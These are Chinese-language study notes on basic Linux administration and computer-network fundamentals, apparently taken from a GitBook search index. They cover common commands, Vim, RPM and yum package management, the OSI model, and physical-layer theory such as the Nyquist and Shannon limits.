/root/：超级用户的家目录。普通用户家目录在“/home”下，超级用于家目录直接在“/”下 /srv/：服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 /tmp/：临时目录。系统存放临时文件的目录，该目录下所有用户都可以访问和写入。我们建议此目录中不能保存重要数据，最好每次开机都把该目录清空 /usr/：系统软件资源目录。注意usr不是user的缩写，而是“Unix Softwre Resource”的缩写，所以不是存放用户数据，而是存放系统软件资源的目录。系统中安装的软件大多数保存在这里，所以除了/usr/bin/和/usr/sbin/这两个目录，我在介绍几个/usr/下的二级目录 /var/：动态数据保存位置。主要保存缓存、日志以及软件运行所产生的文件 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 15:28 "},"兄弟连Linux/Linux常用命令.html":{"url":"兄弟连Linux/Linux常用命令.html","title":"Linux常用命令","keywords":"","body":"Linux常用命令 文件处理命令 目录处理命令：ls【ll 为 ls -ld 缩写】 命令名称：ls 命令英文原意：list 命令所在路径：/bin/ls 执行权限：所有用户 功能描述：显示目录文件 语法：ls 选项[-ald] [文件或目录] -a 显示所有文件，包括隐藏文件 -l 详细信息显示 -d 查看指定目录属性 -i 查看文件i节点（一个文件一定一个i节点，一个i节点不一定只对应一个文件） -rw-r--r-- 开头标识文件类型，-二进制文件 d目录 l软链接文件,read，write，execute 目录处理命令：mkdir 命令名称：mkdir 命令英文原意：make directories 命令所在路径：/bin/mkdir 执行权限：所有用户 语法：mkdir -p [目录名] 功能描述：创建新目录，-p 递归创建 范例： $mkdir -p /tmp/Japan/boduo $mkdir /tmp/Japan/longze /tmp/Japan/cangjing 目录处理命令：cd 命令名称：cd 命令英文原意：change directory 命令所在路径：shell内置命令 执行权限：所有用户 语法：cd [目录] 功能描述：切换目录 范例： $cd /tmp/Japan/boduo 切换到指定目录 $cd .. 回到上一级目录 目录处理命令：pwd 命令名称：pwd 命令英文原意：print working directory 命令所在路径：/bin/pwd 执行权限：所有用户 语法：pwd 功能描述：显示当前目录 文件处理命令：rmdir 命令名称：rmdir 命令英文原意：remove empty directories 命令所在路径：/bin/rmdir 执行权限：所有用户 语法：rmdir [目录名]。 功能描述：删除空目录 范例：$rmdir /tmp/Japan/boduo 目录处理命令：cp 命令名称：cp 命令英文原意：copy 命令所在路径：/bin/cp 执行权限：所有用户 语法：cp -rp [原文件或目录] [目标目录] -r 复制目录 -p 保留文件属性 功能描述：复制文件或目录 目录处理命令：mv 命令名称：mv 命令英文原意：move 命令所在路径：/bin/mv 执行权限：所有用户 语法：mv [原文件或目录] [目标目录] 功能描述：剪切文件、改名 目录处理命令：rm 命令名称：rm 命令英文原意：remove 命令所在路径：/bin/rm 执行权限：所有用户 语法：rm -rf [文件或目录] -r 删除目录 -f 强制执行 功能描述：删除文件 文件处理命令：touch 命令名称：touch 命令所在路径：/bin/touch 执行权限：所有用户 语法：touch [文件名] 功能描述：创建空文件 范例：$touch Japanlovestory.list 创建带空格的文件名时要带“”如：“program files”（不建议文件名带空格） 文件处理命令：cat/tac 命令名称：cat/tac 命令所在路径：/bin/cat 执行权限：所有用户 语法：cat [文件名] / tac [文件名] 功能描述：显示文件内容 / 反向显示文件内容 -n 显示行号 范例： $cat-n /etc/services 、tac /etc/services 文件处理命令：more 命令名称：more 命令所在路径：/bin/more 执行权限：所有用户 语法：more [文件名] （空格）或f 翻页 b 回翻 （Enter） 换行 q或Q 退出 功能描述：分页显示文件内容 范例：$more /etc/services 文件处理命令：less 命令名称：less 命令所在路径：/usr/bin/less 执行权限：所有用户 语法：less [文件名] 空格、f、pg on 翻页 b、pg up 回翻 Enter、↑、 ↓ 换行 q或Q 退出 /关键词 搜索（按n换页继续搜索） 功能描述：分页显示文件内容（可向上翻页） 范例：$less /etc/services 文件处理命令：head 命令名称：head 命令所在路径：/usr/bin/head 执行权限：所有用户 语法：head [文件名] 功能描述：显示文件前面几行（默认10行） -n 指定行数 范例：$head -n 20 /etc/services 文件处理命令：tail 命令名称：tail 命令所在路径：/usr/bin/tail 执行权限：所有用户 语法：tail [文件名] 功能描述：显示文件后面几行 -n 指定行数 -f 动态显示文件末尾内容 范例：$tail -n 18 /etc/services 文件处理命令：ln 命令名称：ln 命令英文原意：link 命令所在路径：/bin/ln 执行权限：所有用户 语法：ln -s [原文件] [目标文件] -s 创建软链接 功能描述：生成链接文件 范例： $ln -s /etc/issue /tmp/issue.soft 创建文件/etc/issue的软链接/tmp/issue.soft $In /etc/issue /tmp/issue.hard 创建文件/etc/issue的硬链接/tmp/issue.hard 软连接特征：（类似Windows快捷方式） lrwxrwxrwx 软连接文件权限都为777 文件大小-只是符号链接 /tmp/issue.soft -> /etc/issue箭头指向源文件 硬链接特征： 功能=cp -p命令+同步更新（其中一个文件删除或丢失不影响另一个文件） 通过i节点识别（i节点相同） 不能跨分区 不能针对目录使用 权限管理命令 权限管理命令：chmod 命令名称：chmod 命令英文原意：change the permissions mode of a file 命令所在路径：/bin/chmod 执行权限：所有者、root 语法： chmod [{ugoa}{+-=}{rwx}] [文件或目录] chmod [mode=421] [文件或目录] -R 递归修改 例如： chmod u+x,a-x 文件名 chmod 421 文件名 功能描述：改变文件或目录权限 权限管理命令：chown 命令名称：chown 命令英文原意：change file ownership 命令所在路径：/bin/chown 执行权限：root 语法：chown [用户] [文件或目录] 功能描述：改变文件或目录的所有者 权限管理命令：chgrp 命令名称：chgrp 命令英文原意：change file group ownership 命令所在路径：/bin/chgrp 执行权限：root 语法：chgrp [用户组] [文件或目录] 功能描述：改变文件或目录的所属组 权限管理命令：umask 命令名称：umask 命令英文原意：the user file-creation mask 命令所在路径：Shell内置命令 执行权限：所有用户 语法：umask [-S] -S 以rwx形式显示新建文件缺省权限 功能描述：显示、设置文件的缺省权限 范例： $umask -S $umask 077 修改文件缺省权限为rwx --- --- 注意：touch 一个新文件默认是没有执行权限的 文件搜索命令 文件搜索命令：find（最可靠，但占用系统资源高） 命令名称：find 命令所在路径：/bin/find 执行权限：所有用户 语法：find [搜索范围] [匹配条件] 功能描述：文件搜索 例如： $ find /etc -name init 在目录/etc中查找文件init -iname 不区分大小写 $ find /etc -name *init* 在目录/etc中查找文件名含有init的文件（*匹配任意字符，？匹配单个字符） $ find / -size +204800 在根目录下查找大于100MB的文件【1K=2数据块(512字节=0.5K)】 +n 大于 -n 小于 n等于 $ find /home -user shenchao 在根目录下查找所有者为shenchao的文件 -group 根据所属组查找 $ find /etc -cmin -5 在/etc下查找5分钟内被修改过属性的文件和目录（+5超过5分钟） -amin 访问时间access -cmin 文件属性change -mmin 文件内容modify $ find /etc -size +163840 -a -size -204800 在/etc下查找大于80MB小于100MB的文件 -a 两个条件同时满足and -o 两个条件满足任意一个即可or $ find /etc -name 文件名 -exec ls -l {} \\； 在/etc下查找inittab文件并显示其详细信息 -exec或者-ok 命令 {} \\；对搜索结果执行操作（-ok会对操作进行询问） $ find /etc -name init* -a -type f 查找以init开头的文件 -type 根据文件类型查找。 f 文件，d 目录，l 软链接文件 -inum 根据i节点查找 文件搜索命令：locate 命令名称：locate 命令所在路径：/usr/bin/locate 执行权限：所有用户 语法：locate 文件名 功能描述：在文件资料库中查找文件 范例：$locate -i inittab （-i不区分大小写） 特点：速度快，但不能实时查找，应该对文件库手动更新updatedb。且无法查找/tmp目录下的内容 文件搜索命令：which 命令名称：which 命令所在路径：/usr/bin/which 执行权限：所有用户 语法：which 命令 功能描述：搜索命令所在目录及别名信息 范例：$which ls 文件搜索命令：whereis 命令名称：whereis 命令所在路径：/usr/bin/whereis 执行权限：所有用户 语法：whereis [命令名称] 功能描述：搜索命令所在目录及帮助文档路径 范例：$whereis ls 文件搜索命令：grep 命令名称：grep 命令所在路径：/bin/grep 执行权限：所有用户 语法：grep -iv [指定字串] [文件] 功能描述：在文件中搜寻字串匹配的那行内容并输出 -i 不区分大小写 -v 排除指定字符串所在行 如：grep -v ^# /etc/inittab 把以#开头的行去掉 范例：#grep mysql /root/install.log 帮助命令 帮助命令：man、info 命令名称：man、info 命令英文原意：manual 命令所在路径：/usr/bin/man 执行权限：所有用户 语法：man或info [命令或配置文件名称（不用路径）] 功能描述：获得帮助信息 范例： $man ls 查看1s命令的帮助信息 $man services 查看配置文件services的帮助信息 $man 5 passswd 查看配置文件passwd的帮助信息（1 命令的帮助 5 配置文件的帮助） 帮助命令：whatis 命令名称：whatis 功能描述：查看命令的简短介绍信息 范例： $whatis ls 查看ls命令的简短介绍信息 帮助命令：apropos 命令名称：apropos 功能描述：查看配置文件的简短介绍信息 范例： $apropos inittab 查看inittab的简短介绍信息 帮助命令：--help 命令名称：--help 功能描述：查看命令的介绍信息 范例： $touch --help 查看touch命令的介绍信息 帮助命令：help 命令名称：help 命令所在路径：Shell内置命令 执行权限：所有用户 语法：help命令 功能描述：获得Shell内置命令的帮助信息 范例： $help umask 查看umask命令的帮助信息 用户管理命令 用户管理命令：useradd 命令名称：useradd 命令所在路径：/usr/sbin/useradd 执行权限：root 语法：useradd 用户名 功能描述：添加新用户 范例：$useradd yangmi 用户管理命令：passwd 命令名称：passwd 命令所在路径：/usr/bin/passwd 执行权限：所有用户 语法：passwd 用户名 功能描述：设置用户密码 范例：$passwd yangmi 用户管理命令：who 命令名称：who 命令所在路径：/usr/bin/who 执行权限：所有用户 语法：who 功能描述：查看登录用户信息 范例：$who 【如下：登录用户名；tty为本地登录，pts为远程登录；ID；登录时间及IP】 none :0 2019-11-11 21:09 (:0) none pts/1 2019-11-11 21:15 (192.168.31.144) 用户管理命令：w 命令名称：w 命令所在路径：/usr/bin/w 执行权限：所有用户 语法：w 功能描述：查看登录用户详细信息 压缩解压命令 压缩命令：gzip 【zip格式Linux和Windows都可直接用】 命令名称：gzip 命令英文原意：GNUzip 命令所在路径：/bin/gzip 执行权限：所有用户 语法：gzip [文件] 功能描述：压缩文件，不保留源文件 压缩后文件格式：.gz 解压命令：gunzip 命令名称：gunzip 命令英文原意：GNUunzip 命令所在路径：/bin/gunzip 执行权限：所有用户 语法：gunzip [压缩文件] 功能描述：解压缩.gz的压缩文件 范例：$gunzip boduo.gz 压缩保留源文件的方法： gzip –c filename > filename.gz 解压缩保留源文件的方法： gunzip –c filename.gz > filename 打包命令：tar 命令名称：tar 命令所在路径：/bin/tar 执行权限：所有用户 语法：tar 选项[-zcf] [压缩后文件名] [被压缩目录名] -c 打包 -v 显示详细信息 -f 指定文件名【必选】 -z 打包同时gzip压缩 功能描述：打包目录 压缩后文件格式：.tar.gz 解包命令：tar tar命令解压缩语法：tar 选项[-zxvf] [被压缩文件名] -x 解包 -v 显示详细信息 -f 指定解压文件 -z 解压缩gzip 范例：$tar -zxf abc.tar.gz 压缩命令：zip 命令名称：zip 命令所在路径：/usr/bin/zip 执行权限：所有用户 语法：zip 选项[-r] [压缩后文件名] [文件或目录] -r 压缩目录 功能描述：压缩文件或目录 压缩后文件格式：.zip 解压命令：unzip 命令名称：unzip 命令所在路径：/usr/bin/unzip 执行权限：所有用户 语法：unzip [压缩文件] 功能描述：解压.zip的压缩文件 范例：$unzip test.zip 压缩解命令：bzip2 【推荐压缩大文件】 命令名称：bzip2 命令所在路径：/usr/bin/bzip2 执行权限：所有用户 语法：bzip2 选项[-k] [文件] -k 产生压缩文件后保留原文件 -j 进行bzip2压缩 功能描述：压缩文件 压缩后文件格式：.bz2 范例： $bzip2 -k boduo $tar -cjf Japan.tar.bz2 Japan 打包且进行bzip2压缩 解压命令：bunzip2 命令名称：bunzip2 命令所在路径：/usr/bin/bunzip2 执行权限：所有用户 语法：bunzip2 选项[-k] [压缩文件] -k 解压缩后保留原文件 功能描述：解压缩 范例： $bunzip2 -k boduo.bz2 $tar -xjf Japan.tar.bz2 解包且进行bzip2解压 网络命令 网络命令：write 指令名称：write 指令所在路径：/usr/bin/write 执行权限：所有用户 语法：write 功能描述：给在线用户发信息，以Ctrl+D保存结束 范例：#write linzhiling 网络命令：wall 指令名称：wall 命令英文原意：write all 指令所在路径：/usr/bin/wall 执行权限：所有用户 语法：wall [message] 功能描述：发广播信息 范例：#wall ShenChao is a honest man！ 网络命令：ping 命令名称：ping 命令所在路径：/bin/ping 执行权限：所有用户 语法：ping 选项 IP地址 -c 指定发送次数 功能描述：测试网络连通性 范例：#ping -c 4 192.168.1.156 网络命令：ifconfig 命令名称：ifconfig 命令英文原意：interface configure 命令所在路径：/sbin/ifconfig 执行权限：root 语法：ifconfig 网卡名称 IP地址 功能描述：查看和设置网卡信息 范例：#ifconfig eth0 192.168.8.250 网络命令：mail 命令名称：mail 命令所在路径：/bin/mail 执行权限：所有用户 语法：mail [用户名] 功能描述：查看发送电子邮件 范例：#mail root 网络命令：last 命令名称：last 命令所在路径：/usr/bin/last 执行权限：所有用户 语法：last 功能描述：列出目前与过去登入系统的用户信息 范例：#last 网络命令：lastlog 命令名称：lastlog 命令所在路径：/usr/bin/lastlog 执行权限：所有用户 语法：lastlog 功能描述：检查某特定用户上次登录的时间 范例： lastlog lastlog -u 用户ID 网络命令：traceroute 命令名称：traceroute 命令所在路径：/bin/traceroute 执行权限：所有用户 语法：traceroute 功能描述：显示数据包到主机间的路径 范例：traceroute www.lampbrother.net 网络命令：netstat 命令名称：netstat 命令所在路径：/bin/netstat 执行权限：所有用户 语法：netstat [选项] 功能描述：显示网络相关信息 选项： -t: TCP协议 -u: UDP协议 -l：监听 -r：路由 -n：显示IP地址和端口号 范例： netstat -tlun 查看本机监听的端口 netstat -an 查看本机所有的网络连接 netstat -rn 查看本机路由表（查看网关） 网络命令：setup（Redhat专有） 命令名称：setup 命令所在路径：/usr/bin/setup 执行权限：root 语法：setup 功能描述：配置网络 范例：#setup 挂载命令（命令行界面需要） 命令名称：mount 命令位置：/bin/mount 执行权限：所有用户 命令语法：mount [-t文件系统] 设备文件名 挂载点（需存在，可自建） 范例： mount -t iso9660 /dev/sr0 /mnt/cdrom umount /dev/sr0 卸载设备（不可在设备目录下执行） 关机重启命令 shutdown命令 语法：shutdown [选项] 时间 选项： -c：取消前一个关机命令 -h：关机 -r：重启 其他关机命令 [root@localhost~]#halt [root@localhost~]#poweroff #相对于直接断电 [root@localhost~]#init 0 其他重启命令 [root@localhost~]#reboot [root@localhost~]#init 6 系统运行级别 0 关机 1 单用户（类似于安全模式） 2 不完全多用户，不含NFS服务 3 完全多用户 4 未分配 5 图形界面 6 重启 [root@localhost~]#cat /etc/inittab systemctl set-default multi-user.target #设定为命令行启动 [root@localhost~]#runlevel #查询系统运行级别 退出登录命令 [root@localhost~]#logout （Windows为win+L） Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 11:18 "},"兄弟连Linux/文本编辑器Vim.html":{"url":"兄弟连Linux/文本编辑器Vim.html","title":"文本编辑器Vim","keywords":"","body":"文本编辑器Vim Vim简介 Vim是一个功能强大的全屏幕文本编辑器，是Linux/UNIX上最常用的文本编辑器，它的作用是建立、编辑、显示文本文件。 Vim没有菜单，只有命令。 插入命令 命令 作用 a 在光标所在字符后插入 A 在光标所在行行尾插入 i 在光标所在字符前插入 I 在光标所在行行首插入 小写o 在光标下插入新行 大写O 在光标上插入新行 定位命令 命令 作用 :set nu 设置行号 :set nonu 取消行号 gg 到第一行 G 到最后一行 nG 到第n行 :n 到第n行 $ 移至行尾 数字0 移至行首 删除命令 命令 作用 x 删除光标所在处的字符 nx 删除光标所在处后n个字符 dd 删除光标所在行，ndd删除n行 dG 删除光标所在行到文件末尾内容 D 删除光标所在处到行尾内容 :n1,n2d 删除指定范围的行:3,9d删除3-9行 复制剪切命令 命令 作用 yy 复制当前行 nyy 复制当前行以下n行 dd 剪切当前行 ndd 剪切当前行以下n行 p、P 粘贴在当前光标所在行下或行上 替换取消命令 命令 作用 r 取代光标所在处的字符 R 从光标所在处开始替换字符，按Esc结束 u 取消上一步操作 搜索替换命令 命令 作用 /string 搜索指定字符串；搜索时忽略大小写:set ic n 搜索指定字符串的下一个出现位置 :%/old/new/g 全文替换指定字符串 g=>c 询问确认 :n1,n2s/old/new/g 在一定范围内替换指定字符串 保存退出命令 命令 作用 :w 保存修改 :w newfilename 另存为指定文件 :wq 保存修改并退出 ZZ 快捷键，保存修改并退出 :q! 不保存修改退出 :wq! 保存修改并退出（文件所有者及root可用） Vim使用技巧 将配置写在/home/username/.vimrc或/root/.vimrc中以免下次重写（需自建.vimrc） :! 命令 如：:!date Sat Nov 16 23:15:56 CST 2019 在不退出vim的情况下执行命令 :r 文件名 导入文件内容到vim里 :r !命令 将命令的执行结果导入vim :map 快捷键 触发命令 若要将快捷键设置为Ctrl+P，实际按键为Ctrl+V+P也可先按Ctrl+V再按Ctrl+P 范例： :map ^P I# 设置Ctrl+P快捷键，使光标所在行首添加“#” :map ^B 0x 设置Ctrl+B快捷键，使删除光标所在行首字符 :ab 原内容 替换内容 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 16:27 "},"兄弟连Linux/软件包管理.html":{"url":"兄弟连Linux/软件包管理.html","title":"软件包管理","keywords":"","body":"软件包管理 软件包分类 源码包 二进制包（RPM包、DEB包系统默认包） 源码包 源码包的优点是： 开源，如果有足够的能力，可以修改源代码 可以自由选择所需的功能 软件是编译安装，所以更加适合自己的系统，更加稳定也效率更高 卸载方便 源码包的缺点： 安装过程步骤较多，尤其安装较大的软件集合时（如LAMP环境搭建），容易出现拼写错误 编译过程时间较长，安装比二进制安装时间长 因为是编译安装，安装过程中一旦报错新手很难解决 RPM包 二进制包的优点： 包管理系统简单，只通过几个命令就可以实现包的安装、升级、查询和卸载 安装速度比源码包安装快的多 二进制包缺点： 经过编译，不再可以看到源代码 功能选择不如源码包灵活 依赖性 RPM包命名原则 httpd-2.2.15-15.el6.centos.1.i686.rpm httpd——软件包名 2.2.15——软件版本 15——软件发布的次数 el6.centos——适合的Linux平台 i686——适合的硬件平台 rpm——rpm包扩展名 RPM包依赖性 树形依赖：a>b>c 环形依赖：a>b>c>a（一条命令同时安装abc） 模块依赖：模块依赖查询网站：www.rpmfind.net（以.so .数字结尾的安装包某个软件包里的软件，需要安装对应的软件包） 包全名与包名 包全名：操作的包是没有安装的软件包时，使用包全名。而且要注意路径 包名：操作已经安装的软件包时，使用包名。是搜索/var/lib/rpm/中的数据库 RPM包安装升级卸载 安装 rpm -ivh 包全名 选项： -i（install） 安装 -v（verbose） 显示详细信息 -h（hash） 显示进度 --nodeps 不检测依赖性 升级 rpm -Uvh 包全名 选项： -U（upgrade） 升级 卸载 rpm -e 包名 选项： -e（erase） 卸载 --nodeps 不检查依赖性 查询软件是否安装 [root@localhost~]#rpm -q 包名 #查询包是否安装 选项： -q 查询（query） [root@localhost~]#rpm -qa #查询所有已经安装的RPM包 选项： -a 所有（all） 查询软件包详细信息 [root@localhost~]#rpm -qi 包名 #查询软件信息 选项： -i 查询软件信息（information） -p 查询未安装包信息（package） [root@localhost~]#rpm -qip 包全名 #查询未安装软件信息 查询包中文件安装位置 [root@localhost~]#rpm -ql 包名 选项： -l 列表（list） -p 查询未安装包信息（package） 查询系统文件属于哪个RPM包 [root@localhost~]#rpm -qf 文件名 选项： -f 查询系统文件属于哪个软件包（file） 查询软件包的依赖性 [root@localhost~]#rpm -qR 包名 【需在包目录下】 选项： -R 查询软件包的依赖性（requires） -p 查询未安装包信息（package） RPM包校验 [root@localhost~]#rpm -V 已安装的包名 选项： -V 校验指定RPM包中的文件（verify）【用于判断文件是否被更改】 验证内容中的8个信息的具体内容如下：【没反馈即ok，没变化为“.”】 S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验和是否改变（可以看成文件内容是否改变） D 设备的中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 文件类型 c 配置文件（config file） d 普通文档（documentation） g “鬼”文件（ghost file），很少见，就是该文件不应该被这个RPM包包含 l 授权文件（license file） r 描述文件（read me） RPM包中文件提取 [root@localhost~]#rpm2cpio 包全名 | cpio -idv .文件绝对路径 rpm2cpio #将pm包转换为cpio格式的命令（2与to同音，所以；\".\"为当前目录下） cpio #是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件 [root@localhost~]#cpio 选项 选项： -i：copy-in模式，还原 -d：还原时自动新建目录 -v：显示还原过程 例如： [root@localhost ~]#rpm -qf /bin/ls 查询ls命令属于哪个软件包 [root@localhost~]#mv /bin/ls /tmp/ 造成ls命令误删除假象 [root@localhost ~]#rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提RPM包中ls命令到当前目录的/bin/ls下 [root@localhost~]#cp /root/bin/ls /bin/ 把ls命令复制会/bin/目录，修复文件丢失 安装位置 RPM包默认安装位置 安装位置 说明 /etc/ 配置文件安装目录 /usr/bin/ 可执行的命令安装目录 /usr/lib/ 程序所使用的函数库保存位置 /usr/share/doc/ 基本的软件使用手册保存位置 /usr/share/man/ 帮助文件保存位置 源码包安装位置 安装在手动指定位置当中，一般是/usr/local/软件名/ 安装位置不同带来的影响 RPM包安装的服务可以使用系统服务管理命令（service）来管理，例如RPM包安装的apache的启动方法是： /usr/sbin/httpd start （可用which httpd查看绝对路径） systemctl start httpd.service 而源码包安装的服务则不能被服务管理命令管理，因为没有安装到默认路径中。所以只能用绝对路径进行服务的管理，如： /usr/local/apache2/bin/apachectl start 源码包安装 安装准备 安装C语言编译器 下载源码包 http://mirror.bit.edu.cn/apache/httpd/ 安装注意事项 源代码保存位置：/usr/local/src/ 软件安装位置：/usr/local/ 如何确定安装过程报错： 安装过程停止 并出现error、warning或no的提示 源码包安装过程 下载源码包 解压缩下载的源码包 进入解压缩目录，查看安装说明INSTALL $ ./configure --prefix=安装路径 软件配置与检查 定义需要的功能选项。 检测系统环境是否符合安装要求。 把定义好的功能选项和检测系统环境的信息都写入Makefile文件，用于后续的编辑。 $ make 编译【如有报错，用make clean清除产生的编译文件】 $ make install 编译安装 $ 安装路径/bin/apachectl start 启动 脚本安装包 脚本安装并不是独立的软件包类型，常见安装的是源码包。 是人为把安装过程写成了自动安装的脚本，只要执行脚本，定义简单的参数，就可以完成安装。 非常类似于Windows下软件的安装方式。 Webmin的作用 Webmin是一个基于Web的Linux系统管理界面。您就可以通过图形化的方式设置用户帐号、Apache、DNS、文件共享等服务。 Webmin安装过程 下载软件 http://sourceforge.net/projects/webadmin/files/webmin/ 解压缩，并进入加压缩目录 执行安装脚本 常用yum命令 查询 [root@localhost~]#yum list #查询所有可用软件包列表 [root@localhost~]#yum search 关键字 #搜索服务器上所有和关键字相关的包 安装 [root@localhost~]#yum -y install 包名 选项： install 安装 -y 自动回答yes 升级 [root@localhost~]#yum -y update 包名 【如果没有加包名会升级所有内容包括内核，慎用！】 选项： update 升级 -y 自动回答yes 卸载 [root@localhost~]#yum -y remove 包名 选项： remove 卸载 -y 自动回答yes YUM软件组管理命令 [root@localhost ~]#yum grouplist #列出所有可用的软件组列表 [root@localhost ~]#yum groupinstall软件组名 #安装指定软件组，组名可以由grouplist查询出来 [root@localhost ~]#yum groupremove软件组名 #卸载指定软件组 光盘yum源搭建步骤 挂载光盘 [root@localhost~]#mount /dev/sr0 /mnt/cdrom/ 让网络yum源文件失效 [root@localhost-]#cd /etc/yum.repos.d/ [root@localhost yum.repos.d]#mv CentOS-Base.repo CentOS-Base.repo.bak [root@localhost yum.repos.d]#mv CentOS-Debuginfo.repo CentOS-Debuginfo.repo.bak [root@localhost yum.repos.d]#mv CentOS-Vault.repo CentOS-Vault.repo.bak 修改光盘yum源文件 [root@localhost yum.repos.d]#vim CentOS-Media.repo baseurl=file://mnt/cdrom #地址为你自己的光盘挂载地址 #file:///media/cdrom/ #并注释这两个不存在的地址 #file:///media/cdrecorder/ gpgcheck=1 enabled=1 #enabled=0改为enabled=1，让这个yum源配置文件生效 【配置文件格式要注意：注释要顶格】 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 11:27 "},"韩立刚计算机网络/概述.html":{"url":"韩立刚计算机网络/概述.html","title":"概述","keywords":"","body":"概述 主机（端系统）： 位于“网络边缘” 运行网络应用程序如：Web，email 客户/服务器（client/server）应用模型： 客户发送请求，接收服务器响应 如：Web应用，文件传输FTP应用 对等（peer to peer，P2P）应用模型： 无（或不仅依赖）专用服务器·通信在对等实体之间直接进行 如：Gnutella，BT，Skype，QQ OSI七层模型 应用层 能够产生网络流量能够和用户交互的应用程序 表示层 加密 、压缩 会话层 服务端和客户端建立的会话 、查木马 netstat -nb 传输层 可靠传输建立会话 、不可靠传输 、流量控制 网络层 IP地址编址 、选择最佳路径 数据链路层 数据如何封装 、添加物理层地址MAC 物理层 电压 、接口标准 数据交换的类型： 电路交换 最典型电路交换网络：电话网络 电路交换的三个阶段： 建立连接（呼叫/电路建立） 通信 释放连接（拆除电路） 独占资源 报文交换 一个信息体整体发送 分组交换 分组：报文拆分出来的一系列相对较小的数据包 分组交换需要报文的拆分与重组 产生额外开销 报文交换与分组交换均采用存储-转发交换方式 区别： 报文交换以完整报文进行“存储-转发” 分组交换以较小的分组进行“存储-转发” 适用于突发数据传输网络 资源充分共享 简单、无需呼叫建立 可能产生拥塞（congestion）：分组延迟和丢失 需要协议处理可靠数据传输和拥塞控制 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:44 "},"韩立刚计算机网络/物理层.html":{"url":"韩立刚计算机网络/物理层.html","title":"物理层","keywords":"","body":"物理层 物理层基本概念 物理层解决如何在连接各种计算机的传输媒体上传输数据比特流而不是指具体的传输媒体。 物理层的主要任务描述为：确定与传输媒体的接口的一些特性，即： 机械特性：接口形状，大小，引线数目 电气特性：规定电压范围（-5V到+5V） 功能特性：规定-5V表示0，+5V表示1 过程特性：也称规程特性，规定建立连接时各个相关部件的工作步骤 奈氏准则（模拟信号） 1924年，奈奎斯特（Nyquist）就推导出了著名的奈氏准则。他给出了在假定的理想条件下，为了避免码间串扰，码元的传输速率的上限值。 在任何信道中，码元传输的速率是有上限的，否则就会出现码间串扰的问题，使接收端对码元的判决（即识别）成为不可能。 如果信道的频带越宽，也就是能够通过的信号高频分量越多，那么就可以用更高的速率传送码元而不出现码间串扰。 理想低通信道的最高码元传输速率=2WBaud W是理想低通信道的带宽，单位为HZ Baud是波特，是码元传输速率的单位 香农定理（数字信号、模拟信号） 香农（Shannon）用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率。 信道的极限信息传输速率C可表达为C=W log2(1+S/N) b/s W为信道的带宽（以Hz为单位） S为信道内所传信号的平均功率 N为信道内部的高斯噪声功率 导向传输媒体 导向传输媒体中，电磁波沿着固体媒体传播。 双绞线 屏蔽双绞线 STP 无屏蔽双绞线 UTP 同轴电缆 50Ω同轴电缆：用于数字传输，由于多用于基带传输，也叫基带同轴电缆 75Ω同轴电缆：用于模拟传输，即宽带同轴电缆 光缆 单模光纤指只能传输一种电磁波模式，多模光纤只可以传输多个电磁波模式，实际上单模光纤和多模光纤之分，也就是纤芯的直径之分。单模光纤细，多模光纤粗。在有线电视网络中使用的光纤全是单模光纤，其传播特性好，带宽可达10GHZ，可以在一根光纤中传输60套PAL-D电视节目。 非导向传输媒体 非导向传输媒体就是指自由空间，其中的电磁波传输被称为无线传输 无线传输所使用的频段很广 短波通信主要是靠电离层的反射，但短波信道的通信质量较差 微波在空间主要是直线传播 地面微波接力通信 卫星通信 相关术语 通信的目的是传送消息。 数据（data）——运送消息的实体。 信号（signal）——数据的电气的或电磁的表现。 模拟信号——代表消息的参数的取值是连续的。 数字信号——代表消息的参数的取值是离散的。 码元（code）——在使用时间域的波形表示数字信号时，则代表不同离散数值的基本波形就成为码元。 在数字通信中常常用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号称为二进制码元。而这个间隔被称为码元长度。1码元可以携带nbit的信息量 信道一般表示向一个方向传送信息的媒体。所以咱们说平常的通信线路往往包含一条发送信息的信道和一条接收信息的信道。 单向通信（单工通信）——只能有一个方向的通信而没有反方向的交互。 双向交替通信（半双工通信）——通信的双方都可以发送信息，但不能双方同时发送（当然也就不能同时接收）。 双向同时通信（全双工通信）——通信的双方可以同时发送和接收信息。 基带信号（即基本频带信号）——来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出的直接表达了要传输的信息的信号，比如我们说话的声波就是基带信号。 带通信号——把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道）。 因此在传输距离较近时，计算机网络都采用基带传输方式由于在近距离范围内基带信号的衰减不大，从而信号内容不会发生变化。因此在传输距离较近时，计算机网络都采用基带传输方式。如从计算机到监视器、打印机等外设的信号就是基带传输的。 几种最基本的调制方法 调幅（AM）：载波的振幅随基带数字信号而变化。 调频（FM）：载波的频率随基带数字信号而变化。 调相（PM）：载波的初始相位随基带数字信号而变化。 常用编码 单极性不归零码 只使用一个电压值，用高电平表示1，没电压表示0。 双极性不归零码 用正电平和负电平分别表示二进制数据的1和0，正负幅值相等。 双极性归零码 正负零三个电平，信号本身携带同步信息。 曼彻斯特编码 bit中间有信号低-高跳变为0；bit中间有信号高-低跳变为1。 差分曼彻斯特编码 bit中间有信号跳变，bit与bit之间也有信号跳变，表示下一个bit为0。bit中间有信号跳变，bit与bit之间无信号跳变，表示下一个bit为1。 差分曼彻斯特编码与曼彻斯特编码相同，但抗干扰性能强于曼彻斯特编码。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:23 